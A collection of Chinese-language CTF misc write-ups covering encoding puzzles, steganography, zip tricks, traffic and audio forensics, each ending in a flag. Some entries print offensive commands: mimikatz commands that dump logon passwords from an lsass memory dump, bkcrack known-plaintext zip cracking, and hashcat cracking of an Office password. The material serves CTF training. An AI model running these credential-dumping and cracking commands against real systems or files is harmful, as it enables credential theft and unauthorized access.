z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==

cyberchef一下得到


发现是一个文件，down下来010看到


猜测是缺少rar文件头，补上。
然后就能在注释里发现flag


flag：flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}
87.[XMAN2018排位赛]通行证拿到一串a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg==
base64解密之后是kanbbrgghjl&#123;zb____&#125;vtlaln
然后最神奇的地方来了，我猜到这里要继续解密，但迟迟不出
最后看了wp发现应该用W型栅栏加密（注意是加密而不是解密）
然后得到kzna&#123;blnl_abj_lbh_trg_vg&#125;
一眼凯撒，解密得到 xman{oyay_now_you_get_it}
flag：flag{oyay_now_you_get_it}
88.[WUSTCTF2020]girlfriend主要得到一个zip，解压出来是一段wav
一下就能听出来时拨号音识别
随波逐流一下


得到
999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777

手机上九宫格按一下，次数对应长按的第几个，然后就能得到flag（记得要换小写）
flag：flag{youaremygirlfriends}
89.[DDCTF2018](╯°□°）╯︵ ┻━┻全文如下：
(╯°□°）╯︵ ┻━┻50pt(╯°□°）╯︵ ┻━┻d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd

这串东西16进制转换得到（注意要切片，2个2个一组）
212 232 225 244 160 247 225 243 160 230 225 243 244 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 196 196 195 212 198 251 185 178 178 225 226 185 185 183 180 225 180 183 227 228 179 178 178 227 230 180 179 226 181 176 182 177 176 230 225 229 225 181 253

发现数字好大，但是这一组组的数字联想到ascii，试着全减去128，得到（这里的偏移也可以脚本试出来应该）
84  104  97  116  32  119  97  115  32  102  97  115  116  33  32  84  104  101  32  102  108  97  103  32  105  115  58  32  68  68  67  84  70  123  57  50  50  97  98  57  57  55  52  97  52  55  99  100  51  50  50  99  102  52  51  98  53  48  54  49  48  102  97  101  97  53  125

然后转化ascii就能得到
That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;

flag：flag{922ab9974a47cd322cf43b50610faea5}
90.[MRCTF2020]千层套路得到一个压缩包，解压一下发现有个0573.zip，解压密码刚好是0573
得到一个0114.zip，猜测有多个类似的压缩包
网上找了个脚本，如下
import osimport zipfile  def extract_and_store_final_file(initial_zip_path, target_dir):    if not os.path.exists(target_dir):        os.makedirs(target_dir)     current_zip_path = initial_zip_path     password = os.path.basename(initial_zip_path)[:4]     while True:        with zipfile.ZipFile(current_zip_path, &#x27;r&#x27;) as zip_ref:            files = zip_ref.namelist()            file_name = files[0]            next_zip_name = os.path.join(target_dir, file_name)            try:                zip_ref.extractall(target_dir, pwd=bytes(password, &#x27;utf-8&#x27;))                print(f&quot;Extracted &#123;file_name&#125; to &#123;target_dir&#125; using password &#123;password&#125;&quot;)            except RuntimeError as e:                print(f&quot;Error extracting &#123;file_name&#125;: &#123;e&#125;&quot;)                break             if file_name.endswith(&#x27;.zip&#x27;):                current_zip_path = next_zip_name                password = file_name[:4]            else:                 print(f&quot;The final file is &#123;file_name&#125;, stored in &#123;target_dir&#125;&quot;)                break   initial_zip_path = &#x27;0573.zip&#x27; #第一个解密的压缩包名称target_dir = &#x27;flag&#x27; #放进的文件夹extract_and_store_final_file(initial_zip_path, target_dir)

千层套路还真是有一千个压缩包。。
最后得到一个qr.txt，看了一眼发现是


感觉是二维码之类的，要RGB数据串转图片一下
随波逐流一下，得到一个二维码




扫一下得到flag：flag{ta01uyout1nreet1n0usandtimes}
91.百里挑一pcap里面有一堆jpg，然而似乎并没什么卵用
直接分组字节流，搜索flag就能发现前半段flag


flag&#123;ae58d0408e26e8f

然后在flag旁边发现http://ns.adobe.com/xap，疑似关键词
搜索adobe，发现后半段flag


26a3c0589d23edeec&#125;

连起来得到flag：flag{ae58d0408e26e8f26a3c0589d23edeec}
92.[SUCTF2018]followme拿到pcapng，随波逐流一把梭


看到CTF{password_is_not_weak}
flag：flag{password_is_not_weak}
93.[MRCTF2020]CyberPunk拿到cyberpunk! .exe，直接运行程序看到


提示我们时间2020.9.17，我们修改电脑时间为2020.9.17
修改完成后重新启动程序就能看到flag了


flag：flag{We1cOm3_70_cyber_security}
94.[BSidesSF2019]zippy拿到pcapng直接foremost一下，得到一个zip，爆破一下发现爆不出来
搜索一下password，发现


unzip -P supercomplexpassword flag.zip

所以supercomplexpassword就是解压密码
得到flag：flag{this_flag_is_your_flag}
95.[安洵杯 2019]Attack拿到的pcap直接foremost，得到一个zip
zip里有一个注释这可是administrator的秘密，怎么能随便给人看呢？
感觉是电脑密码有关的，看到流量包里面有一个lsass.dmp

dmp文件是windows系统中的错误转储文件，当Windows发生错误蓝屏的时候，系统将当前内存【含虚拟内存】中的数据直接写到文件中去，方便定位故障原因。
里面包含主机用户密码信息

.dmp文件binwalk和foremost提不出来，需要我们手动提一下
提出来之后用mimikatz分析文件，下载地址 发行版 2.2.0 20220919 Djoin parser &amp; Citrix SSO Extractor · gentilkiwi&#x2F;mimikatz · GitHub
这个是已经打包好的exe，直接运行就行
相关命令
//提升权限privilege::debug//载入dmp文件sekurlsa::minidump lsass.dmp//读取登陆密码sekurlsa::logonpasswords full



发现密码
W3lc0meToD0g3

解压得到D0g3{3466b11de8894198af3636c5bd1efce2} （这个在txt最后一行）
flag：flag{3466b11de8894198af3636c5bd1efce2} 
96.[UTCTF2020]basic-forensics得到一个jpeg，实则不然，010打开发现只有文字。
直接txt打开，搜索flag发现utflag{fil3_ext3nsi0ns_4r3nt_r34l}
flag：flag{fil3_ext3nsi0ns_4r3nt_r34l}
97.[SUCTF 2019]Game一个zip和一张图片，zip里html打开发现


得到suctf{hAHaha_Fak3_F1ag}，好吧是假的
图片在lsb里发现


U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==

base64显示Salted__，是加了盐的
使用网站进行解密 在线Triple DES加密 | Triple DES解密- 在线工具，密钥就是之前的假密码


得到suctf{U_F0und_1t}
flag：flag{U_F0und_1t}
98.USB得到一个233.rar和一个key.ftm
key.ftm用foremost分离出两个zip，解压出来是一个key.pcap
打开发现是usb流量，使用UsbKeyboardDataHacker
地址这里  GitHub - WangYihang&#x2F;UsbKeyboardDataHacker: USB键盘流量包取证工具 , 用于恢复用户的击键信息
使用它，发现


key&#123;xinan&#125;

然后我们回过头来看压缩包，压缩包拖进010发现报错了
修改文件头把7A改成74
然后就能发现压缩包凭空多出来一张png
lsb一下发现一个二维码


扫一下得到
ci&#123;v3erf_0tygidv2_fc0&#125;

结合之前得到的key维吉尼亚解密一下得到
fa&#123;i3eei_0llgvgn2_sc0&#125;

隐约见到flag字符，栅栏解密得到flag：flag{vig3ne2e_is_c00l}
99.[DDCTF2018]流量分析提示我们补齐私钥格式，而打开发现没有http流，猜测为http被加密了
我们接着寻找tcp及其中的私钥
搜索
tcp contains&quot;KEY&quot;

发现了三个流，依次追踪tcp流


在第二个tcp流中发现了一个被base64加密的图片


使用随波逐流的base64转图片得到


提取其中文字，并保存在新建的文本中（不放心的话可以在这里转换一下md5和提示里的相比较）
接下来就是添加解密私钥，查看http明文了
编辑-首选项-Protocols-TLS-Edit-+-Key File-Browse
查看http，发现就两个流
在第二个流里发现DDCTF{0ca2d8642f90e10efd9092cd6a2831c0}
flag：flag{0ca2d8642f90e10efd9092cd6a2831c0}
100.[GUET-CTF2019]虚假的压缩包解压压缩包发现一个虚假的压缩包和一个真实的压缩包
虚假的压缩包可以用7z解压出来，看到一个key.txt，内容如下
数学题n = 33e = 3解26-------------------------答案是

这里应该就是考我们rsa加密了
脚本（网上找的，当然不用脚本也可以用ai直接算出答案）：
 import gmpy2 def find_pq(n):    for p in range(2, int(n**0.5) + 1):        if n % p == 0:            q = n // p            return p, q    return None def rsa_decrypt(n, e, c):    p, q = find_pq(n)    phi_n = (p - 1) * (q - 1)    d = gmpy2.invert(e, phi_n)    m = pow(c, d, n)    return m n = 33  # 替换为实际的n值e = 3 # 替换为实际的e值c = 26  # 替换为实际的密文c值 plaintext = rsa_decrypt(n, e, c) print(&quot;明文m为:&quot;, plaintext)  #请注意，上述代码中的 n、e、c 需要根据实际情况进行替换。

最后得出答案是5
用答案是5解压一个真实的压缩包
得到 一张没卵用且会浪费你时间的图片.jpg 和 亦真亦假
把一张没卵用且会浪费你时间的图片.jpg直接拖进随波逐流发现压缩了宽高，下方是：


我们对另一个文件进行异或5
使用随波逐流，选择进制转换/16进制字符串异或（不用随波逐流的话也可以网上找脚本）


保存的hex.txt使用010另存为文件
看到504B0304的文件头本来以为是zip，结果一打开才发现是docx
打开之后全标红发现：


flag&#123;_th2_7ru8_2iP_&#125;



101.[RCTF2019]draw全文：
cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home

题目名字加文本感觉就是画图没跑了
直接在线网站： Logo解释器


flag：flag{RCTF_HeyLogo}
102.[ACTF新生赛2020]明文攻击哇，盐都不盐了，直接说明文攻击了。
解压后得到一张woo.jpg和res.zip
感觉思路就是图片隐写+明文攻击了
这题纯分离是分不出来的，需要我们010看这张图片


看到一个PK文件头里面有flag.txt，但是解压不出来。
再往前看发现有一个0304，但是缺少504B，感觉就是因为这个所以才解压不出来，补上文件头，再另存一下


解压出来看到flag.txt里面的内容是
this is the flag.

对比一下CRC32，发现跟res.zip里面那个是一样的，所以就靠这个来明文攻击了
命令：
bkcrack -C res.zip -c flag.txt -P 1.zip -p flag.txt

然后就能爆出来了


密钥：
251dfe00 ec858db2 6e8a0dff

另存：
bkcrack -C res.zip -k 251dfe00 ec858db2 6e8a0dff -U out.zip 1234

就能看到ACTF{3te9_nbb_ahh8}
flag：flag{3te9_nbb_ahh8}
103.[SWPU2019]Network下载之后看到诸如：


这种。
实际上这是TTL加密

[!NOTE]
TTL加密：简单来说就是，图中63，127，191，255转化为二进制的值分别为 00111111，01111111，10111111，11111111。
发现只有前两位不同，TTL加密就是利用前两位进行加密，将每个前两位重新进行合并，8位为一组。
所以TTL加密的解密方法：
1，将所有前两位合并为8位，并且每八位一组。
2，将上面的每组转化为十六进制的字符

解密脚本：
import binascii f = open(&#x27;1.txt&#x27;, &quot;r&quot;)str = &#x27;&#x27;Binary = &#x27;&#x27;number = &#x27;&#x27;while 1:    num = f.readline()    if not num:        break    if num.rstrip() == &#x27;63&#x27;:  # 去掉每行后面的空格        Binary = &#x27;00&#x27;    elif num.rstrip() == &#x27;127&#x27;:        Binary = &#x27;01&#x27;    elif num.rstrip() == &#x27;191&#x27;:        Binary = &#x27;10&#x27;    elif num.rstrip() == &#x27;255&#x27;:        Binary = &#x27;11&#x27;    str += Binaryfor i in range(0, len(str), 8):    number += chr(int(str[i:i + 8], 2))data = binascii.unhexlify(number) f2=open(&#x27;111.txt&#x27;,&#x27;wb&#x27;)f2.write(data)f2.close()

这个脚本要跑好一会。
然后我们把111.txt拖到010，发现是一个zip文件，还是加密的zip
是伪加密，直接随波逐流修复后打开flag.txt发现


一眼是base64，而且是多次base64解密，建议脚本，其他都不好用
f = open(&#x27;./flag.txt&#x27;).read()import base64while 1:    try:        f = base64.b32decode(f)        print(f.decode()[:100])    except:        try:            f = base64.b64decode(f)            print(f.decode()[:100])        except:            print(f[:100])            break

解密得到flag
flag：flag{189ff9e5b743ae95f940a6ccc6dbd9ab}
104.[GKCTF 2021]签到打开发现一堆http流量，点进一个看一下


解码之后发现是php.llehspmt
是倒序的，正序一下就是tmpshell.php
继续看下一个流量，然后在一个比较大的文件解密之后看到


即
wIDIgACIgACIgAyIK0wIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMiCNoQDjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjoQDjACIgACIgACIggDM6EDM6AjMgAzMtMDMtEjMt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0iCNMyIjMyIjMyIjMyI6AjMgAzMtMDMtEjMwIjO0eZ62ep5K0wKrQWYwVGdv5EItAiM1Aydl5mK6M6jlfpqnrQDt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLK0AIdZavo75mlvlCNMTM6EDMz0yMw0SMyAjM6Q7lpb7lmrQDrsCZhBXZ09mTg0CIyUDI3VmbqozoPW+lqeuCN0SLt0SLt0SLt0SLsxWZld1V913e7d2ZhFGbsZmZg0lp9iunbW+Wg0lp9iunbW+Wg0lp9iunbW+WK0wMxoTMwoDMyACMDN0QDN0QDlWazNXMx0Wbf9lRGRDNDN0ard0Rf9VZl1WbwADIdRampDKilvFIdRampDKilvVKpM2Y==QIhM0QDN0Q

直接解密是解密不出的
仔细看看发现最后一行的第一个是&#x3D;&#x3D;，按理来说应该是最后一个，所以猜测是每行逆向过了
逆向回来
DQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyAgICAgICAgIDIwMjEtMDMtMzAgMjA6MDE6MDggICAgICAgICAjDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQrnqpflj6M6Km5ldyA1MiAtIE5vdGVwYWQrKw0K5pe26Ze0OjIwMjEtMDMtMzAgMjA6MDE6MTMNClvlm57ovaZdIA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCueql+WPozoqbmV3IDUyIC0gTm90ZXBhZCsrDQrml7bpl7Q6MjAyMS0wMy0zMCAyMDowMToxMw0KW+Wbnui9pl0gW+Wbnui9pl0gW+Wbnui9pl0gZmZsbGFhZ2d7e319V1dlZWxsY2MpKVvliKDpmaRdIFvliKDpmaRdIDAwbW1lZV9fR0dra0NDNDRGRl9fbW0xMXNzaWlDQ0NDQ0NDQ0NDQ0MhIQ==

然后base64就能解密出flag了（注意这里是双写要去重）
flag：flag{Welc0me_GkC4F_m1siCCCCCC!}
105.[MRCTF2020]Hello_ misc得到一个png和一个加密的压缩包，一看就是png有问题
直接foremost一下这个png，得到一个zip和一个png
lsb一下这个png


又发现一个png，保存下来看到


密码：
!@#$%67*()-+

解压这个压缩包看到


这里大概思路就是将这串东西转化为二进制后发现只有前两位不同，整合起来转ascii码然后转为字符
脚本：
with open(&#x27;out.txt&#x27;,&#x27;r&#x27;) as Dec:    res = &#x27;&#x27;    for i in Dec.readlines():        Bin = &#x27;&#123;:08b&#125;&#x27;.format(int(i))        print(Bin)        Sub_Bin = Bin[:-6]        res += Sub_Bin    print(res)     for j in range(0,len(res),8):        full_bin = res[j:j+8]        print(chr(int(full_bin,2)),end=&quot;&quot;)

最后就能爆破出rar-passwd:0ac1fe6b77be5dbe
解压出fffflag.zip一看就是docx，接下来就是crtla改色
MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAxMTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDExMTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTExMTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTExMTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTExMTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx

base64，用脚本解密（因为这里需要换行）
import base64# 要解码的字符串encoded_str = &#x27;&#x27;&#x27;MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAxMTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDExMTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTExMTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTExMTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTExMTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx&#x27;&#x27;&#x27;# 按行分割字符串lines = encoded_str.split(&#x27;\n&#x27;)# 逐行解码并打印for line in lines:    decoded_str = base64.b64decode(line).decode()    decoded_str = decoded_str.replace(&#x27;1&#x27;, &#x27; &#x27;)    print(decoded_str)

看到


flag：flag{He1Lo_mi5c~}
106.[UTCTF2020]zero全文：
Lorem ipsum​​​​​​​ dolor ‌‌‌‌‍﻿‍‍sit​​​​​​​​ amet​​​​​​​​​‌‌‌‌‍﻿‍‌, consectetur ​​​​​​​adipiscing​​​​​​​‌‌‌‌‍‬‍‬ elit​​​​​​​.‌‌‌‌‍‬﻿‌​​​​​​​‌‌‌‌‍‬‌‍ Phasellus quis​​​​​​​ tempus​​​​​​ ante, ​​​​​​​​nec vehicula​​​​​​​​​​​​​​​​ mi​​​​​​​​. ​​​​​​​‌‌‌‌‍‬‍﻿Aliquam nec​​​​​​​​​‌‌‌‌‍﻿‬﻿ nisi ut neque​​​​​​​ interdum auctor​​​​​​​.‌‌‌‌‍﻿‍﻿ Aliquam felis ‌‌‌‌‍‬‬‌orci​​​​​​​, vestibulum ‌‌‌‌‍﻿‬‍sit ​​​​​​​amet​​​​​​​​​ ante‌‌‌‌‍‌﻿‬ at​​​​​​​, consectetur‌‌‌‌‍‌﻿﻿ lobortis eros​​​​​​​​​.‌‌‌‌‍‍‍‌ ‌‌‌‌‍‌‌‌​​​​​​​Orci varius​​​​​​​ ​​​​​​​natoque ‌‌‌‌‍﻿‌﻿penatibus et ‌‌‌‌‍‬‌﻿​​​​​​​magnis‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‍ dis ​​​​​​​‌‌‌‌‍‍﻿﻿parturient montes, ​​​​​​​nascetur ridiculus ‌‌‌‌‌﻿‍‌​​​​​​​​​​​​​​‌‌‌‌‌﻿‬‍mus. In finibus‌‌‌‌‌﻿‌‬ magna​​​​​​‌‌‌‌‌﻿‍﻿ mauris, quis‌‌‌‌‍‬‌‍ auctor ‌‌‌‌‍‬‌‍libero congue quis. ‌‌‌‌‍‬‬‬Duis‌‌‌‌‍‬‌‬ sagittis consequat urna non tristique. Pellentesque eu lorem ‌‌‌‌‍﻿‌‍id‌‌‌‌‍‬‬﻿ quam vestibulum ultricies vel ac purus‌‌‌‌‌﻿‌‍.‌‌‌‌‌﻿‍‌‌‌‌‌‍﻿﻿‍

一眼零宽字符
直接出了utflag{whyNOT@sc11_4927aajbqk14}
flag：flag{whyNOT@sc11_4927aajbqk14}
107.[CFI-CTF 2018]webLogon capture总共就没几个流量，慢慢看每个流量就行
然后就发现了这串东西：
&#x2F;password:%20%43%46%49%7b%31%6e%73%33%63%75%72%33%5f%6c%30%67%30%6e%7d%20
解密一下：&#x2F;password: CFI{1ns3cur3_l0g0n} 
flag：flag{1ns3cur3_l0g0n} 
108.[WUSTCTF2020]spaceclub一个txt，打开却什么都没有，sublime打开发现一堆点点点，是有间距的


尝试把长的换成1，短的换成0
（利用记事本的替换功能）
得到：
011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101

然后随波逐流2进制转ascii就能得到flag了：wctf2020{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}
flag：flag{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}
109.[ACTF新生赛2020]music一段MP4，视频打不开
我们010打开发现


有一堆A1，猜测是整个文件进行了A1异或，我们异或回来


然后就能正常打开了，听到是在报字母于是得到flag
flag：flag{abcdfghijk}
110.[MRCTF2020]Unravel!!（痛，太痛了——）
一张图片和一段视频和一个加密的zip
将图片进行foremost，得到一张图片aes.png，上面内容是：
Tokyo

而视频的末尾有一段
key=U2FsdGVkX1/nSQN+hoHL8OwV9iJB/mSdKk5dmusulz4=

猜测是aes加密
在线网站： 在线加密解密
解密得
CCGandGulu

然后解密这个zip，又得到一段音频，直接slighteye解密得到flag：MRCTF{Th1s_is_the_3nd1n9}
flag：flag{Th1s_is_the_3nd1n9}
111.[GKCTF 2021]excel 骚操作打开xlsx，先点左上角，选中全部单元格
然后设置单元格格式，数字，常规，确定
看到一堆1


把所有的1用黑色填黑
CTL+F，替换-格式-填充-选黑色-确定
发现了二维码（可以把单元格变窄一点，列宽改成2.11）


这里一般的扫不出来，需要用中国编码app（因为这是汉信码）


flag：flag{9ee0cb62-f443-4a72-e9a3-43c0b910757e}
112.[UTCTF2020]File Carving得到一个png，RGB通道发现This is one of the twists: there is no flag here!.
foremost发现一个zip，打开无后缀


file一下发现是elf文件，直接
./1



flag：flag{2fbe9adc2ad89c71da48cabe90a121c0}
113.[MRCTF2020]pyFlag文件里有三张图片，每一张图片后面都有之外的东西。
要提取出三张图片后面的内容拼接成一个压缩包。
然后发现压缩包是加密的，爆破一下是1234
然后提示我们用了多个base加密
直接basecrack出了


看到MRCTF{Y0u_Are_4_p3rFect_dec0der}
flag：flag{Y0u_Are_4_p3rFect_dec0der}
114.[watevrCTF 2019]Evil Cuteness得到一张图片，直接foremost一下
然后发现一个压缩包
解压得到flag：watevr{7h475_4c7u4lly_r34lly_cu73_7h0u6h}
flag：flag{7h475_4c7u4lly_r34lly_cu73_7h0u6h}
115.大流量分析（一）要求我们找到黑客的ip地址，直接打开wireshark看
利用wireshark的统计-IPv4 Statistics-ALL Address功能可以查看IP的数量大小


看到ip183.129.152.140数量最多
flag：flag{183.129.152.140}
116.[QCTF2018]X-man-A face得到一张图片，一看就是修复二维码
修复好之后长这样：
解码之后得到
KFBVIRT3KBZGK5DUPFPVG2LTORSXEX2XNBXV6QTVPFZV6TLFL5GG6YTTORSXE7I=

base64解码QCTF{Pretty_Sister_Who_Buys_Me_Lobster}
flag：flag{Pretty_Sister_Who_Buys_Me_Lobster}
117.二维码就是纯拼接二维码
尝试拼接了一下，结果拼不起来。。


我的尝试。。拼尽全力只能做到这种程度了。
直接找wp的二维码了


扫一下就能得到flag了
flag：flag{7bf116c8ec2545708781fd4a0dda44e5}
118.派大星的烦恼010打开图片，看到


将所有的22换成0，44换成1
得到
0110110000101100000011000110110010011100101011000000110010000110101011000010110010001100000111000010110001000110001001101010110001100110101001100110110001000110011011001010011010101100010001100010110011000110101001100010110011001100000111001100110001001100

然后这里我们cyberchef需要先reverse再binary，后reverse才能出


flag：flag{6406950a54184bd5fe6b6e5b4ce43832}
119.key不在这里一张二维码，扫码得到
https://cn.bing.com/search?q=key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&amp;m=10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&amp;qs=n&amp;form=QBRE&amp;sp=-1&amp;sc=0-38&amp;sk=&amp;cvid=2CE15329C18147CBA4C1CA97C8E1BB8C

点开发现是再bing上搜索key不在这里
发现这里有一串数字
10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568

猜测是ascii码
试了前几个发现打印出flag
所以直接转一下ascii就能出
脚本（网上找的
s = &#x27;10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&#x27;temp = &#x27;&#x27;while len(s):    if int(s[:3]) &lt; 127:        temp += chr(int(s[:3]))        s = s[3:]    else:        temp += chr(int(s[:2]))        s = s[2:]print(temp)

flag：flag{5d45fa256372224f48746c6fb8e33b32}
120.[INSHack2017]sanity解压得到一个md文件，直接打开发现INSA{Youre_sane_Good_for_you}
flag：flag{Youre_sane_Good_for_you}
121.[V&amp;N2020 公开赛]真·签到直接在题目描述里面了
flag：flag{welcome_to_vn}
122.粽子的来历打开发现四个doc，又发现打不开doc，010发现


将这里换成FF，即换成yy就能打开了
打开发现行距不一样，将大的行距换成1，小的换成0


100100100001，flag为md5加密的值
flag：flag{d473ee3def34bd022f8e5233036b3345}
123.[MRCTF2020]不眠之夜打开发现有很多图片碎片，需要我们拼接一下
先
montage *.jpg -tile 10x12 -geometry 200x100+0+0 flag.jpg

拼成一张碎片图


然后利用gaps拼接图片
gaps run flag.jpg solution.jpg --generations=40 --population=120 --size=200

或者直接利用Puzzle-Merak来拼接图片
注意这里新增图片的时候选择的像素不是40而是100
然后–generations&#x3D;40 –population&#x3D;120 –size&#x3D;200，得到


看到MRCTTF{Why_4re_U_5o_ShuL1an??}
flag：flag{Why_4re_U_5o_ShuL1an??}
124.hashcat得到一个What kind of document is this_，是ppt文件
先利用office2john.py把哈希值拿到
python office2john.py 1.ppt &gt;hash



然后利用hashcat爆破就行
hashcat.exe -a 3 -m 9500 --force hash --increment --increment-min 1 --increment-max 6 ?d?d?d?d?d?d

查看密码
hashcat.exe -m 9500 hash --show

能够爆出来是9919



或者直接passwarekit直接爆破得到密码：9919
直接在第七页里面看到了Flag{okYOUWIN}
flag：flag{okYOUWIN}
125.[UTCTF2020]sstv得到一个wav音频，直接sstv
sstv -d 1.wav -o result.png

直接就出了utflag[6bdfeac1e2baa12d6ac5384cdfd166b0]
flag：flag{6bdfeac1e2baa12d6ac5384cdfd166b0}
126.voip拿到i一个流量包，直接电话-voip通话
然后点第一个播放就能拿到flag
flag：flag{9001IVR}
127.[SCTF2019]电单车解压得到一段音频，直接进aud看看


这是PT2242信号，电动车的解锁信号，前面4bit表示同步码，中间的20bit表示地址码，后面的4bit表示功能码，最后一位是停止码。
以时间的长短来分别0和1，那么就是0。。。01110100101010100110。0010。0
也就是00111010010101010011000100
flag：flag{01110100101010100110}
128.[GUET-CTF2019]soul sipse拿到一个wav，先打开频谱图，看到


然后我们用steghide
steghide extract -sf out.wav

得到一张图片，打不开，我们随波逐流修复文件头或者手动修一下
就能看到图片了


一看就是unicode编码
直接随波逐流unicode转str得到
40701234

相加之和就是5304
flag：flag{5304}
129.[UTCTF2020]spectogramaud打开发现直接看频谱图发现flag


flag：flag{sp3tr0gr4m0ph0n3}
130.大流量分析（二）说是发送了一个钓鱼邮件，我们直接过滤smtp流量看看


追踪tcp流之后发现
![屏幕截图 2025-03-03 115626](.&#x2F;Misc-Record&#x2F;屏幕截图 2025-03-03 115626.png)
这个就是发送者的邮箱了xsser@live.cn
flag{&#x78;&#x73;&#115;&#101;&#x72;&#64;&#108;&#105;&#118;&#101;&#46;&#x63;&#x6e;}
131.蜘蛛侠呀一段流量。
发现icmp后面每段都带有一段的data数据，猜测是将一个文件分散在了这里。
可以使用tshark导出这些数据，然后去重，再用脚本
提取：
tshark -r out.pcap -T fields -e data &gt; data.txt

去重脚本：
